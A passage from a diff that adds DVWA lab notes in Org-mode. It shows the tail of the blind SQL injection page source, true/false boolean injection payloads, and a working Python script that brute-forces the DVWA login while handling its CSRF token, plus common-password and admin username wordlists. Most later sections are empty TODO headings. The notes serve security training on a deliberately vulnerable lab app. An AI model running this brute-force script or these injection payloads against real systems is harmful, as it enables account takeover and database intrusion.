+        if( rand( 0, 5 ) == 3 ) {
+            sleep( rand( 2, 4 ) );
+        }
+
+        // User wasn't found, so the page wasn't!
+        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
+
+        // Feedback for end user
+        echo '<pre>User ID is MISSING from the database.</pre>';
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?>
+    #+end_src
+
+*** Vulnerability
+    The code to trigger the false/true condition is as follows:
+
+    - true condition
+
+      #+begin_example
+"1' AND 1=1 -- "
+      #+end_example
+
+    - false condition
+
+      #+begin_example
+"1' AND 1=0 -- "
+      #+end_example
+    
+*** TODO Attack
+** TODO Impossible
+
+* TODO Brute Force
+** Custom - Login brute force
+   The following python script can be used to brute force the official
+   login of DVWA. This was showcased in the following video:
+
+   [[https://www.youtube.com/watch?v=vvMGNbwIh_M][DVWA 02 - Attacco al login iniziale con python]]
+
+
+   #+begin_src python
+!/usr/bin/python3
+
+import requests
+from bs4 import BeautifulSoup
+
+URL = "http://127.0.0.3/dvwa/login.php"
+
+PASSWORD_WORDLIST = "./password_wordlist.txt"
+USERNAME_WORDLIST = "./username_wordlist.txt"
+
+proxies = {
+    "http": "http://127.0.0.1:8080"
+}
+
+def check_credentials(username, password):    
+    # -- first request to get CSRF code and cookie value
+    r1 = requests.get(URL, proxies=proxies)
+    
+    cookie = r1.headers["Set-Cookie"].split("PHPSESSID=")[1].split(";")[0]    
+    soup = BeautifulSoup(r1.text, 'html.parser')
+    csrf_token = soup.find("input", {"name": "user_token"})["value"]
+    
+    # -- second request to check creds    
+    data = f"username={username}&password={password}&Login=Login&user_token={csrf_token}"
+    
+    custom_headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Cookie": f"security=impossible; PHPSESSID={cookie}",
+    }
+
+    r2 = requests.post(URL, headers=custom_headers, data=data, proxies=proxies,
+                       allow_redirects=False)
+
+    # -- third request to follow redirect
+    r3 = requests.get(URL, headers=custom_headers, proxies=proxies)
+    
+    if "Login failed" in r3.text:
+        return False
+    else:
+        return True
+    
+# --------------------------
+# Execution starts here
+
+if __name__ == "__main__":
+    # -- example
+    # print(check_credentials("username", "password"))
+    
+    # -- read wordlists files
+    usernames = []
+    f = open(USERNAME_WORDLIST, "r")
+    usernames = f.read().splitlines()
+    f.close()
+
+    passwords = []
+    f = open(PASSWORD_WORDLIST, "r")
+    passwords = f.read().splitlines()
+    f.close()
+
+
+    # -- for each user
+    for user in usernames:
+        # -- and for each password
+        for password in passwords:
+            # -- test (user, password)
+            if check_credentials(user, password):
+                print(f"Found credentials! ({user}:{password})")
+                exit()
+   #+end_src
+
+   We can use the following wordlists
+
+   - *password_wordlist.txt*
+
+     #+begin_example
+123456
+12345
+123456789
+password
+iloveyou
+princess
+1234567
+rockyou
+12345678
+abc123
+nicole
+daniel
+babygirl
+monkey
+lovely
+jessica
+654321
+michael
+ashley
+qwerty
+111111
+iloveu
+000000
+michelle
+tigger
+sunshine
+chocolate
+password1
+soccer
+anthony
+friends
+butterfly
+purple
+angel
+jordan
+liverpool
+justin
+loveme
+fuckyou
+123123
+football
+secret
+andrea
+carlos
+jennifer
+joshua
+bubbles
+1234567890
+superman
+hannah
+amanda
+loveyou
+pretty
+basketball
+andrew
+angels
+tweety
+flower
+playboy
+hello
+     #+end_example
+
+   - *username_wordlist.txt*
+
+     #+begin_example
+administrator
+admin
+user
+guest
+     #+end_example
+   
+** TODO Low  
+** TODO Medium
+** TODO High
+** TODO Impossible
+* TODO Command Injection
+** TODO Low  
+** TODO Medium
+** TODO High
+** TODO Impossible  
+* TODO CSRF
+** TODO Low  
+** TODO Medium
+** TODO High
+** TODO Impossible
+* TODO File Inclusion
+** TODO Low  
+** TODO Medium
+** TODO High
+** TODO Impossible
+* TODO File Upload
+** TODO Low  
+** TODO Medium
+** TODO High
+** TODO Impossible  
+* TODO Insecure CAPTCHA
+** TODO Low  
+** TODO Medium
+** TODO High
+** TODO Impossible
+* TODO Weak Session IDs
+** TODO Low  
+** TODO Medium
+** TODO High
+** TODO Impossible  
+* TODO XSS (DOM)
+** TODO Low  
+** TODO Medium
+** TODO High
+** TODO Impossible
+* TODO XSS (Reflected)
+** TODO Low  
+** TODO Medium
+** TODO High
+** TODO Impossible
+* TODO XSS (Stored)
+** TODO Low  
+** TODO Medium
+** TODO High
+** TODO Impossible  
+* TODO CSP Bypass
+** TODO Low  
+** TODO Medium
+** TODO High
+** TODO Impossible
+* TODO JavaScript
+** TODO Low  
+** TODO Medium
+** TODO High
+** TODO Impossible  
